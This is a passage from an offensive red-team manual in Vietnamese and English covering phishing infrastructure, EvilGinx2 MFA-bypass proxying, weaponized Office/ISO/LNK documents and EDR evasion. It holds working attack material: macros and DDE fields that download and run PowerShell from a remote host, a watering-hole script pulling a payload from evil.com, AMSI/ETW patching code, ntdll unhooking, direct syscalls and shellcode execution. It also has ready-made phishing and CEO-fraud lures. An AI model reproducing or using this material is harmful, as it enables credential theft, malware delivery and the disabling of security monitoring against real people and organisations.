        time.sleep(sleep_time)

if __name__ == "__main__":
    beacon()
```

---

## C. INITIAL ACCESS & PHISHING

### 1. Phishing Infrastructure — Building a Convincing Presence

#### Domain Setup

**Domain Registration:**
- **Registrar:** Njalla, Porkbun, Namecheap (WHOIS privacy). Tránh GoDaddy — nhiều blacklist hơn.
- **Domain Age:** Domain càng cũ càng ít bị spam filter chặn. Mua domain aged (>1 năm) từ auctions (ExpiredDomains.net).
- **TLD:** .com, .org, .net ít bị penalize nhất. Tránh .xyz, .top, .work — thường xuyên bị spam.
- **Domain Name Tips:**
  - Typosquatting: micr0soft.com, go0gle.com.
  - Legitimate-looking: sharepoint-login.com, portal-auth.com.
  - Combination: công ty-login-service.com.

**DNS Configuration:**
```dns
; Domains cho phishing campaign
A record: landingpage.example.com -> 192.168.1.10
MX record: @ -> smtp.example.com (SPF/DKIM cần cho gửi email)
CNAME: www -> landingpage.example.com
TXT: SPF record -> "v=spf1 ip4:192.168.1.10 include:_spf.google.com ~all"
TXT: DKIM -> "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb..."
TXT: DMARC -> "v=DMARC1; p=none; rua=mailto:monitor@example.com"
```

#### SPF/DKIM/DMARC — Email Authentication

**SPF (Sender Policy Framework):**
- Xác định IP nào được phép gửi email từ domain.
- Record: `v=spf1 ip4:YOUR_IP include:spf.yourprovider.com ~all`
- `~all` (softfail) — cho phép email từ IP khác nhưng flagged.
- `-all` (hardfail) — strict, rejected.
- Dùng `~all` cho phishing campaigns.

**DKIM (DomainKeys Identified Mail):**
- Digital sign email với private key.
- Recipient server verify signature với public key trong DNS.
- Tạo DKIM key pair và publish record.
- Mỗi email template nên có DKIM signature riêng.

**DMARC (Domain-based Message Authentication, Reporting & Conformance):**
- Chính sách xử lý email không pass SPF/DKIM.
- `p=none` — monitoring only, không block.
- `p=quarantine` — mark as spam.
- `p=reject` — reject outright.
- `rua=` — aggregate report email.
- `ruf=` — forensic report email.
- Khuyên dùng `p=none` cho phishing campaigns.

#### Redirector Setup (Apache/Nginx)

**Nginx Reverse Proxy:**

```nginx
server {
    listen 80;
    server_name landingpage.example.com;
    
    location / {
        proxy_pass https://real-target-login.com;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_ssl_server_name on;
        sub_filter_once off;
        sub_filter 'https://real-target-login.com' 'https://landingpage.example.com';
    }
    
    location /capture {
        proxy_pass http://127.0.0.1:8080/gophish;
        proxy_set_header Host $host;
    }
}

server {
    listen 443 ssl;
    server_name landingpage.example.com;
    
    ssl_certificate /etc/letsencrypt/live/landingpage.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/landingpage.example.com/privkey.pem;
    
    location / {
        proxy_pass https://real-target-login.com;
        proxy_set_header Host $host;
        proxy_ssl_server_name on;
        sub_filter_once off;
        sub_filter 'https://real-target-login.com' 'https://landingpage.example.com';
    }
}
```

#### GoPhish — Email Campaign Platform

**GoPhish Architecture:**
- **Web UI:** Quản lý campaigns, templates, landing pages, nhóm targets.
- **SMTP Relay:** Gửi email qua SMTP server.
- **Tracking:** Open rate, click rate, data submission.

**Setup Workflow:**
1. Upload targets (CSV: email, first name, last name, position, company).
2. Import/design email template (HTML).
3. Setup landing page (clone legitimate site, ngrok, hoặc custom).
4. Configure SMTP relay (tài khoản email đã compromised hoặc VPS).
5. Launch campaign.
6. Monitor kết quả real-time.

**Email Template Tips:**
- **Subject line:** "Urgent: Action Required", "Your account has been locked", "Scheduled maintenance".
- **Sender name:** "IT Support", "HR Department", "Security Team".
- **Body:** Lo-fi design (ít HTML), có vẻ từ internal tool.
- **URL:** Anchor text khác href (visual → real link).
- **Footer:** Disclaimer thật.
- **Attachments:** PDF, DOCX, ISO, LNK (tùy theo campaign).

### 2. EvilGinx2 — MFA Bypass Proxy

**EvilGinx2** là reverse proxy framework cho credential harvesting và MFA bypass.

#### How It Works

```
[User] → [EvilGinx] → [Real Server]
   ↑                     ↑
   |___ session cookie ___|
```

EvilGinx đứng giữa user và legitimate website. Nó:
1. Proxy request từ victim đến real server.
2. Lưu lại credentials, session cookies, 2FA codes.
3. Duy trì session để operator có thể access tài khoản sau khi victim login.

**MFA Bypass Types:**
- **Session Cookie Theft:** Sau khi victim login MFA, steal session cookie → operator access mà không cần MFA.
- **OAuth Token Intercept:** Intercept OAuth flow, lấy access/refresh tokens.
- **SMS/App 2FA:** Proxy SMS hoặc authenticator app code — victim nhập code, EvilGinx capture và forward.

#### Setup EvilGinx2

```bash
# Clone repo
git clone https://github.com/kgretzky/evilginx2
cd evilginx2

# Build
go build

# Run
sudo ./evilginx2 -p 443 -t 80

# EvilGinx console
:config domain landingpage.example.com
:config ip 192.168.1.10
:phishlets list
:phishlets hostname outlook landingpage.example.com
:phishlets get-hosts outlook
:phishlets enable outlook
:sessions
```

**Supported Phishlets:**
- outlook, office365, microsoft, google, linkedin, github, dropbox, facebook, twitter, instagram, adobe, amazon, bitbucket, atlassian, cisco, cloudflare, docker, docusign, heroku, mailchimp, okta, onelogin, slack, spotify, trello, zendesk, zoom

### 3. Modlishka — Reverse Proxy Phishing

**Modlishka** (bởi Drk1wi) là reverse proxy framework tương tự EvilGinx nhưng có nhiều automation hơn.

**Key Features:**
- **Automatic Let's Encrypt:** Tự động generate SSL certs.
- **Pattern Matching:** Configurable URL rewriting rules.
- **Multi-Domain:** Handle nhiều domain cùng lúc.
- **Credential Tracking:** Track credentials và 2FA tokens.
- **Session Tracking:** Track active sessions.
- **Plugin System:** Extensible via plugins.

### 4. Weaponized Documents — Kỹ Thuật Tạo Payload

#### Macros — VBA Macro Malware

```vba
Sub AutoOpen()
    Dim str As String
    str = "powershell -NoP -NonI -W Hidden -Exec Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('http://example.com/a')"""
    CreateObject("WScript.Shell").Run str, 0, False
End Sub
```

**Modern Macro Issues:**
- Microsoft mặc định block macros từ internet (Mark of the Web).
- AMSI scan VBA code khi chạy.
- AV engines scan macro content.

**VBA Stomping:** Technique bỏ P-code (compiled VBA) và chỉ giữ source code. VBA interpreter dùng P-code nếu available → có thể inject malicious P-code và giả vờ source code là benign.

```bash
# evilclippy — VBA stomping
python evilclippy.py -f malicious.docm -s message.bin -g -o stomped.docm
```

#### DDE (Dynamic Data Exchange)

**DDE Exploit:** Cũ hơn, nhưng vẫn hoạt động nếu macro bị block.

```text
{DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -NoP -Sta -NonI -W Hidden $cmd=(New-Object Net.WebClient).DownloadString('http://example.com/load.ps1'); IEX($cmd)"}
```

- Tạo Word document → Insert → Field → DDEAUTO.
- Không cần macros, không cần VBA.
- Microsoft đã patch DDE field execution warning nhưng vẫn có thể bypass với social engineering.

#### Excel 4.0 Macro (XLM)

**XLM macros** không dùng VBA — dùng old Excel 4.0 macro language:

```xlm
=EXEC("powershell -NoP -NonI -W Hidden -Exec Bypass -enc <base64_cmd>")
=HALT()
```

**Lợi thế:**
- AMSI detection thấp hơn.
- Không bị block bởi macro security policies.
- Có thể obfuscate dễ dàng.
- Excel 4.0 macro có thể được inject vào workbook từ VBA hoặc .NET.

#### OLE — Object Linking & Embedding

**OLE Package:** Embed executable trong Office document. File "looks" harmless (PDF, text) nhưng thực chất là EXE.

```powershell
# Tạo OLE package với PowerShell
$pk = New-Object -ComObject "Package"
$pk.Open("malicious.exe", "", 1, 0, 0, "readme.pdf", "")
$pk.Save("document.doc")
```

#### OneNote — .one Attachment

**OneNote Injection:** Tạo .one file với embedded file (thường là .bat, .ps1, .exe). Victim click "Open" → execute.

**Kỹ thuật:**
- Tạo OneNote document.
- Insert → File → Chọn payload.
- Double-click icon → code chạy.
- Có thể tạo icon giống legitimate (PDF icon, Excel icon).

#### ISO/LNK — The Modern Combo

**ISO + LNK** là technique phổ biến nhất 2022-2024:

1. **ISO file:** Contains payload + LNK.
2. **LNK (Shortcut):** Target = `powershell.exe -c "..."` hoặc `mshta.exe`.
3. Victim double-click ISO → nó mount như CD-ROM.
4. LNK trong ISO chạy → execution.

**Cách tạo:**
```bash
# Tạo LNK với powershell command
$ws = New-Object -ComObject WScript.Shell
$s = $ws.CreateShortcut("payload.lnk")
$s.TargetPath = "powershell.exe"
$s.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwA..."
$s.IconLocation = "C:\\Windows\\System32\\shell32.dll,1"
$s.Save()

# Tạo ISO
.\oscdimg.exe -n -d -m "C:\payload_folder" "payload.iso"
```

**Lợi thế:** ISO mount không tạo Mark of the Web → LNK không bị block.

### 5. Watering Hole Attacks

**Watering Hole:** Compromise website mà target thường xuyên visit.

**Kỹ thuật:**
1. Xác định target: "Nhân viên công ty X thường vào forum Y."
2. Compromise forum Y (SQLi, XSS, credential stuffing).
3. Inject malicious script vào forum pages.
4. Khi target visit, script download và execute C2 payload.
5. Drive-by download hoặc social engineering → execution.

**Implementation:**
```javascript
// Inject vào compromised page
fetch('https://evil.com/payload.bin')
  .then(r => r.blob())
  .then(b => {
    const a = document.createElement('a');
    a.href = URL.createObjectURL(b);
    a.download = 'update.zip';
    a.click();
  });
```

### 6. Social Engineering Pretexts

**Common Pretexts:**

1. **IT Support / Helpdesk:**
   - "We are updating your password policy. Please click to verify."
   - "Your mailbox is almost full. Clean up here."
   - "System upgrade scheduled tonight. Confirm your credentials."

2. **HR / Payroll:**
   - "Updated employee benefits package."
   - "Year-end bonus statement."
   - "Mandatory training compliance."

3. **Security Team:**
   - "Suspicious login detected. Verify your account."
   - "Failed authentication attempts. Click to review."
   - "New security policy requires MFA re-enrollment."

4. **Executive / CEO Fraud (Whaling):**
   - "I need you to wire transfer $50,000 for acquisition."
   - "Send me the list of all employee W2s."
   - "Urgent payment to vendor — process now."

5. **Third-Party / Vendor:**
   - "DocuSign: Document ready for signature."
   - "Adobe: Your invoice is attached."
   - "Zoom: You were invited to a meeting."

6. **Generic / Urgency-based:**
   - "Your account has been compromised. Click to secure."
   - "Unusual activity detected. Verify immediately."
   - "Access will be revoked in 24 hours."

---

## D. DEFENSE EVASION — EDR/SIEM/XDR

### 1. EDR Internals — Kiến Trúc Bên Trong

**EDR (Endpoint Detection and Response)** là hệ thống monitoring và detection chạy trên endpoint. Khác với AV truyền thống (dùng signature), EDR dùng behavioral analysis.

#### Các Thành Phần Chính Của EDR

```
┌─────────────────────────────────────────┐
│            EDR Agent (Endpoint)         │
│  ┌──────────────┐  ┌────────────────┐   │
│  │  Kernel Driver│  │  Userland Proc │   │
│  │  (Callbacks)  │  │  (ETW, AMSI,   │   │
│  │  PsCreate,    │  │   Userland     │   │
│  │  ImageLoad,   │  │   Hooks)       │   │
│  │  Registry,    │  │                │   │
│  │  Object,      │  │                │   │
│  │  Process)     │  │                │   │
│  └──────────────┘  └────────────────┘   │
│                     ┌────────────────┐   │
│                     │  Cloud Sensor  │   │
│                     │  (Telemetry)   │   │
│                     └────────────────┘   │
└─────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────┐
│         EDR Backend / Cloud              │
│  ┌──────────────┐  ┌────────────────┐   │
│  │  SIEM/Log    │  │  Detection     │   │
│  │  Aggregation │  │  Engine (ML+   │   │
│  │              │  │  Rules+Sigma)  │   │
│  └──────────────┘  └────────────────┘   │
│  ┌──────────────┐  ┌────────────────┐   │
│  │  Threat      │  │  Response      │   │
│  │  Intelligence │  │  (Quarantine,  │   │
│  │  Feeds       │  │  Kill Process) │   │
│  └──────────────┘  └────────────────┘   │
└─────────────────────────────────────────┘
```

**EDR Agent có 3 lớp thu thập dữ liệu chính:**

1. **Kernel-mode callbacks:** Tầng thấp nhất, không thể bypass dễ dàng.
2. **Userland hooks:** API hooking trong process memory.
3. **ETW (Event Tracing for Windows):** Event provider từ Windows.

### 2. ETW — Event Tracing for Windows

**ETW** là hệ thống event tracing built-in của Windows. EDR dùng ETW để monitor hầu hết hoạt động:

- **Microsoft-Windows-Kernel-Process:** Process creation, termination.
- **Microsoft-Windows-Kernel-Network:** Network connections.
- **Microsoft-Windows-DotNETRuntime:** .NET assembly loading, JIT events.
- **Microsoft-Windows-PowerShell:** PowerShell pipeline execution, script block logging.
- **Microsoft-Antimalware-Engine:** AMSI scan events.
- **Microsoft-Windows-CodeIntegrity:** Code integrity checks, WDAC.

#### ETW Providers

Mỗi ETW provider có GUID và cung cấp events.

| Provider | GUID | Mục đích |
|---|---|---|
| Microsoft-Windows-Kernel-Process | {22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716} | Process create/terminate |
| Microsoft-Windows-Kernel-Network | {7dd42a49-5329-4832-8dfd-43d979153a88} | Network events |
| Microsoft-Windows-DotNETRuntime | {e13c0d23-ccbc-4e12-931b-d9cc2eee27e4} | .NET events |
| Microsoft-Windows-PowerShell | {a0c1853b-5c40-4b15-8766-3cf1c58f985a} | PowerShell pipeline |
| Microsoft-Antimalware-Engine | {dcf2cd56-c0b4-49f6-8b9a-65b7ef69491a} | AMSI scan events |

#### ETW Evasion Techniques

**1. Patching etwEventWrite:**
ETW logging gọi function `EtwEventWrite` trong ntdll.dll. Patch function này để nó không log events.

```c
// Patch ETW bằng cách ghi ret instruction
BYTE patch[] = { 0xc3 }; // ret
void* etwAddr = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "EtwEventWrite");
DWORD oldProtect;
VirtualProtect(etwAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(etwAddr, patch, 1);
VirtualProtect(etwAddr, 1, oldProtect, &oldProtect);
```

Dùng `NtProtectVirtualMemory` direct syscall để tránh userland hooks.

**2. EtEventProvider — Disable Provider:**
Dùng `EventSetInformation` với `EventProviderSetTraits` để disable specific provider.

```c
// Disable ETW provider
EVENT_FILTER_EVENT_ID eventIds[] = { ... };
EVENT_FILTER_HEADER filter = { ... };
EventSetInformation(providerHandle, EventProviderSetTraits, 
                    &filter, sizeof(filter));
```

**3. ETW Protection Bypass:**
Windows 11 có ETW protection (Antimalware-light): dùng `EtwWrite` với `EventWriteEx` có flag `EVENTWRITE_FLAG_ETW_PROTECTED`.

```c
// ETW protected process — can't be patched
// Use NtSetInformationProcess với ProcessEnableEtw
ULONG protect = 1;
NtSetInformationProcess(GetCurrentProcess(), ProcessEnableEtw, 
                        &protect, sizeof(protect));
```

Tuy nhiên technique này chỉ available cho protected processes (ELAM drivers).

**4. ETW Bypass via Disable Logger:**
```c
// Disable trace sessions
const WCHAR loggerName[] = L"Microsoft-Windows-CodeIntegrity";
EVENT_TRACE_PROPERTIES* properties = ...;
ControlTraceW(NULL, loggerName, properties, EVENT_TRACE_CONTROL_STOP);
```

**5. .NET ETW Bypass:**
Khi .NET assembly execute, ETW ghi JIT events. Bypass bằng cách:
- Patch `amsi.dll` và `clr.dll` ETW functions.
- Dùng `System.Runtime.InteropServices` để patch unmanaged code.

### 3. AMSI — Antimalware Scan Interface

**AMSI** là interface cho phép Windows apps (PowerShell, VBScript, JScript, VBA, .NET) gửi content đến AV/EDR để scan.

#### How AMSI Works

```
[PowerShell/VBA/JS/.NET] → [amsi.dll] → [AMSI Provider (AV/EDR)]
                              ↓
                         Scan Result:
                         AMSI_RESULT_CLEAN
                         AMSI_RESULT_DETECTED (block)
                         AMSI_RESULT_BLOCKED_BY_ADMIN_START
```

**AMSI Scan Points:**
- **Script Content:** PowerShell script, VBA macro, JavaScript.
- **Script Execution:** pipeline execution, `Invoke-Expression`, `Invoke-Command`.
- **Memory Scan:** `AmsiScanBuffer` — scan arbitrary memory buffer.
- **String Operations:** Scan strings được decrypt/construct dynamically.

#### AMSI Bypass Methods

**Method 1: Patching AmsiScanBuffer (v1)**

Patch `amsi.dll!AmsiScanBuffer` để luôn return `AMSI_RESULT_CLEAN`.

```c
// Patch AmsiScanBuffer
HMODULE amsi = LoadLibraryA("amsi.dll");
void* asb = GetProcAddress(amsi, "AmsiScanBuffer");
BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, 0; ret
DWORD oldProtect;
VirtualProtect(asb, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(asb, patch, 6);
VirtualProtect(asb, 6, oldProtect, &oldProtect);
```

**Method 2: Patching AmsiScanBuffer (v2) — Return Early**

```c
// Return 0x80070057 (E_INVALIDARG) — function returns early
BYTE patch[] = { 0x32, 0xC0, 0xC3 }; // xor al, al; ret
```

**Method 3: Patching AmsiScanBuffer (v3) — Hardware Breakpoints**

Dùng hardware debug registers để set breakpoint trên `AmsiScanBuffer` và modify return value.

```powershell
# PowerShell AMSI bypass via reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Method 4: Registry Bypass**

```powershell
# Disable AMSI via registry
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings' -Name 'AmsiEnable' -Value 0
```

**Method 5: DLL Unhooking Reflection**

Unhook AMSI provider DLL bằng cách map fresh copy từ disk:

```c
// Map fresh copy of amsi.dll
HANDLE file = CreateFile(L"C:\\Windows\\System32\\amsi.dll", ...);
HANDLE mapping = CreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, NULL);
LPVOID freshDll = MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);

// Get original AmiScanBuffer code
void* freshAsb = (BYTE*)freshDll + offset;
// Copy back to hooked location
memcpy(hookedAsb, freshAsb, size);
```

**Method 6: PowerShell CLM + AMSI Bypass**

Combined approach — first break out of Constrained Language Mode, then disable AMSI:

```powershell
# PowerShell CLM bypass using reflection
$c = @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@
$w = Add-Type -memberDefinition $c -Name "W" -Namespace Win32 -passthru
$p = $w::LoadLibrary("amsi.dll")
$a = $w::GetProcAddress($p, "AmsiScanBuffer")
$t = [byte[]] (0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3)
$w::VirtualProtect($a, [uintptr]::new(6), 0x40, [ref] 0)
[System.Runtime.InteropServices.Marshal]::Copy($t, 0, $a, 6)
```

#### AMSI + ETW Combined Patch

```c
// Patch both AMSI and ETW in one function
void PatchDefenses() {
    // AMSI
    HMODULE amsi = LoadLibraryA("amsi.dll");
    void* asb = GetProcAddress(amsi, "AmsiScanBuffer");
    if (asb) {
        BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
        WriteProcessMemory(GetCurrentProcess(), asb, patch, 6, NULL);
    }
    
    // ETW
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    void* etw = GetProcAddress(ntdll, "EtwEventWrite");
    if (etw) {
        BYTE patch[] = { 0xC3 };
        WriteProcessMemory(GetCurrentProcess(), etw, patch, 1, NULL);
    }
}
```

### 4. DLL Unhooking (ntdll.dll)

**Problem:** EDR hook ntdll.dll functions (NtCreateProcess, NtOpenProcess, etc.) bằng inline hooks. Khi process gọi API, hook được trigger → EDR kiểm tra.

**Solution:** Replace hooked ntdll.dll với fresh copy từ disk.

#### Method 1: Suspended Process + LoadLibrary

```c
// 1. Create suspended process
STARTUPINFO si = {0};
PROCESS_INFORMATION pi = {0};
CreateProcess(L"C:\\Windows\\System32\\rundll32.exe", NULL, NULL, NULL,
              FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. Get handle to process
HANDLE hProcess = pi.hProcess;

// 3. Allocate memory in target for ntdll path
void* remotePath = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, remotePath, L"C:\\Windows\\System32\\ntdll.dll", MAX_PATH, NULL);

// 4. Load ntdll in remote process via LoadLibraryW
// (Remote process has clean ntdll)
HMODULE kernel32 = GetModuleHandle(L"kernel32.dll");
void* loadLibAddr = GetProcAddress(kernel32, "LoadLibraryW");
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, loadLibAddr, remotePath, 0, NULL);
WaitForSingleObject(hThread, INFINITE);

// 5. Get base address of fresh ntdll in remote process
GetExitCodeThread(hThread, &freshNtdllBase);

// 6. Read fresh ntdll sections back
NtReadVirtualMemory(hProcess, freshNtdllBase, freshNtdllBuffer, ntdllSize, NULL);

// 7. Unmap old ntdll and map fresh version
NtUnmapViewOfSection(GetCurrentProcess(), GetModuleHandle(L"ntdll.dll"));
NtMapViewOfSection(hMapping, GetCurrentProcess(), &freshNtdllBase, 0, 0, NULL, ...);

// 8. Cleanup
TerminateProcess(hProcess, 0);
CloseHandle(hProcess);
```

#### Method 2: Map Fresh Copy from Disk (Same Process)

```c
// Map ntdll from disk
HANDLE file = CreateFile(L"C:\\Windows\\System32\\ntdll.dll", 
                         GENERIC_READ, FILE_SHARE_READ, NULL, 
                         OPEN_EXISTING, 0, NULL);
HANDLE mapping = CreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, NULL);
LPVOID mapped = MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);

// Parse PE to find text section
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mapped;
PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)mapped + dos->e_lfanew);
PIMAGE_SECTION_HEADER textSection = IMAGE_FIRST_SECTION(nt);

// Find text section in current ntdll
HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
PIMAGE_SECTION_HEADER currentText = ...;

// Copy clean code over hooked code
DWORD oldProtect;
VirtualProtect(currentText->VirtualAddress, textSection->SizeOfRawData, 
               PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(currentText->VirtualAddress, (BYTE*)mapped + textSection->PointerToRawData, 
       textSection->SizeOfRawData);
VirtualProtect(currentText->VirtualAddress, textSection->SizeOfRawData, 
               oldProtect, &oldProtect);

UnmapViewOfFile(mapped);
CloseHandle(mapping);
CloseHandle(file);
```

### 5. Kernel Callbacks — The Untouchable Layer

**Kernel callbacks** là cơ chế mà driver đăng ký với Windows kernel để được notify khi các events xảy ra.

#### Process Creation — PsSetCreateProcessNotifyRoutine

```c
// EDR registers callback
NTSTATUS PsSetCreateProcessNotifyRoutine(
    PCREATE_PROCESS_NOTIFY_ROUTINE NotifyRoutine,
    BOOLEAN Remove
);
```

Khi một process mới được tạo (bao gồm cả suspended), EDR nhận được callback với PID, parent PID, command line, và có thể block process.

**Evasion:**
- Không thể dễ dàng bypass kernel callbacks từ userland.
- Technique: `NtCreateProcess` với `DEBUG_PROCESS_ONLY` flag — process không fully created.
- Dùng process hollowing từ pre-created process (w/low noise).

#### Thread Creation — PsSetCreateThreadNotifyRoutine

Khi thread mới được tạo (bao gồm CreateRemoteThread), EDR được notify.

**Evasion:**
- Dùng Threadless injection — không tạo thread mới.
- QueueUserAPC → existing thread.
- Callback Hell (Nighthawk) — dùng callbacks thay vì threads.

#### Image Load — PsSetLoadImageNotifyRoutine

Khi DLL hoặc EXE được load, EDR được notify.

**Evasion:**
- Load module bằng tay (manual mapping) — không qua LoadLibrary → không trigger callback.
- DLL sideloading qua legitimate signed binary.
- Module Stomping — overwrite existing loaded module.

#### Registry — CmRegisterCallback

Khi registry keys modified, EDR được notify.

**Evasion:**
- Dùng kernel-mode custom driver (nếu có).
- Dùng direct registry manipulation via `NtSetValueKey` với custom handle.
- Registry transaction (TxF).

### 6. Userland Hooks Evasion — Direct Syscalls

**Userland Hooks:** EDR modifies API functions in DLLs (ntdll.dll, kernel32.dll, etc.) để monitoring. Khi gọi `NtCreateProcess`, EDR hook được trigger trước/sau khi syscall thực thi.

**Solution: Direct Syscalls — Bỏ qua ntdll.dll, gọi syscall trực tiếp.**

#### SysWhispers2/3

**SysWhispers** là tool generate assembly code cho direct syscalls.

```c
// SysWhispers generates syscall stubs
// Tránh ntdll.dll hoàn toàn

__asm {
    mov r10, rcx
    mov eax, syscall_number  // e.g., 0x55 for NtAllocateVirtualMemory
    syscall
    ret
}
```

**SysWhispers2** features:
- Generate syscall stubs từ JSON definitions.
- Support x86 và x64.
- Select syscalls: chỉ generate những gì cần (smaller footprint).
- Direct syscall — không call qua ntdll.

**SysWhispers3** adds:
- Indirect syscalls (call syscall instructions from ntdll).
- Random syscall number mutation.
- XOR-encoded syscall numbers.

```c
// SysWhispers2 usage
#include "syscalls.h"

// Tự động generate stubs
Syscall(MEM_ALLOC, &addr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
Syscall(MEM_PROTECT, &addr, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
Syscall(CREATE_THREAD, &hThread, THREAD_ALL_ACCESS, NULL, addr, NULL, 0, NULL);
Syscall(WAIT_FOR_SINGLE_OBJECT, hThread, FALSE, NULL);
```

#### Hell's Gate / Halo's Gate

**Hell's Gate:** Technique dynamic resolution của syscall numbers bằng cách:
1. Đọc raw bytes từ ntdll.dll (không qua LoadLibrary, parse từ disk).
2. Tìm syscall instructions (0x0F 0x05) trong ntdll text section.
3. Extract syscall number từ `mov eax, SYSCALL_NUM` instruction trước syscall.
4. Use extracted number để thực hiện direct syscall.

**Halo's Gate:** Extension của Hell's Gate — bỏ qua "hooked" syscalls bằng cách:
1. Tìm syscall instruction trong ntdll.
2. Nếu instruction bị hook (jmp/call khác thường), skip và tìm function kế bên.
3. Syscall number có thể lấy từ function bị hook.

```c
// Hell's Gate pseudo code
DWORD GetSyscallNumber(const char* functionName) {
    // Read ntdll from disk
    BYTE* ntdll = read_file("C:\\Windows\\System32\\ntdll.dll");
    PE_HEADER* pe = (PE_HEADER*)ntdll;
    
    // Parse export directory
    EXPORT_DIR* exports = ...;
    for each export {
        if (strcmp(export->name, functionName) == 0) {
            BYTE* func = ntdll + export->address;
            // Look for: mov eax, SYSCALL_NUMBER (B8 XX XX XX XX)
            if (func[0] == 0xB8) { // mov eax, imm32
                return *(DWORD*)(func + 1);
            }
            // Or: mov eax, SYSCALL_NUMBER (B8) inside hooked stub
        }
    }
}
```

**ParallelSyscalls:** Technique đồng thời thực thi syscall từ thread khác để tránh detection.

**RecycledGate:** Kết hợp Hell's Gate + Halo's Gate + indirect syscalls.

### 7. Stack Spoofing — Xóa Dấu Vết Call Stack

**Stack traces** là vết tích của function calls. Khi EDR detect suspicious behavior, nó có thể inspect call stack → phát hiện allocation à la shellcode → execution.

**Stack Spoofing Techniques:**

1. **Call Stack Shuffling:** Xóa call stack entries khi thực thi shellcode.
2. **Return Address Obfuscation:** Sửa return addresses trên stack.
3. **RtlCaptureStackBackTrace Evasion:** Dùng function khác thay vì standard APIs.

```c
// Spoof stack frame
void SpoofStack(void* shellcode) {
    // Get current stack base
    NT_TIB* tib = (NT_TIB*)__readgsqword(0x30);
    void* stackBase = tib->StackBase;
    void* stackLimit = tib->StackLimit;
    
    // Overwrite stack frames with benign patterns
    memset(stackLimit, 0xCC, (BYTE*)stackBase - (BYTE*)stackLimit);
    
    // Create fake call stack
    void* fakeStack[] = {
        GetProcAddress(kernel32, "BaseThreadInitThunk"),
        GetProcAddress(kernel32, "ThreadStart"),
        shellcode
    };
    memcpy(_AddressOfReturnAddress(), fakeStack, sizeof(fakeStack));
}
```

### 8. Memory Scanning — Tránh Phát Hiện

**Memory Scanning:** EDR scan process memory để tìm:
- Shellcode signatures.
- PE headers.
- Known bad byte sequences.
- RWX memory regions.

#### Blocked Memory Regions

```c
// Tránh scan bằng cách block memory regions
void BlockMemoryScan() {
    // 1. NtSetInformationProcess với ProcessTraceFlags
    ULONG traceFlags = 0x01;
    NtSetInformationProcess(GetCurrentProcess(), 
                           ProcessTraceFlags, &traceFlags, sizeof(traceFlags));
    
    // 2. NtSetInformationProcess với ProcessMitigationPolicy
    PROCESS_MITIGATION_ASLR_POLICY aslr = {0};
    aslr.EnableBottomUpRandomization = 1;
    aslr.EnableForceRelocateImages = 1;
    NtSetInformationProcess(GetCurrentProcess(), 
                           ProcessMitigationPolicy, &aslr, sizeof(aslr));
}
```

#### Heap Obfuscation

```c
// Obfuscate heap allocations
void* ObfuscatedAlloc(size_t size) {
    // Allocate with PAGE_NOACCESS to hide from scanners
    void* addr = VirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_NOACCESS);
    
    // Partially commit pages that are actually used
    VirtualAlloc(addr, size, MEM_COMMIT, PAGE_READWRITE);
    
    // XOR obfuscate content
    for (int i = 0; i < size; i++) {
        ((BYTE*)addr)[i] ^= 0xAA;
    }
    
    return addr;
}
```

#### RW → RWX Masking

**Best practice:** Không bao giờ để memory region có cả WRITE + EXECUTE permissions cùng lúc.

```c
void ExecuteWithRWX_Masking(void* shellcode, size_t size) {
    // Allocate RW
    void* exec_mem = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // Copy shellcode (RW)
    memcpy(exec_mem, shellcode, size);
    
    // Change to RX before execution
    DWORD oldProtect = 0;
    VirtualProtect(exec_mem, size, PAGE_EXECUTE_READ, &oldProtect);
    
    // Execute
    ((void(*)())exec_mem)();
    
    // Change back to RW after execution
    VirtualProtect(exec_mem, size, PAGE_READWRITE, &oldProtect);
}
```

### 9. Sleep Masking — Beacon Obfuscation When Idle

**The Problem:** Khi beacon đang sleep (không giao tiếp C2), nó vẫn nằm trong memory. EDR có thể scan memory và phát hiện malicious content trong beacon.

**The Solution:** Obfuscate/encrypt beacon memory khi sleep, decrypt khi wake.

#### Ekko Technique

**Ekko** dùng `WaitForSingleObject` timers để obfuscate beacon memory:

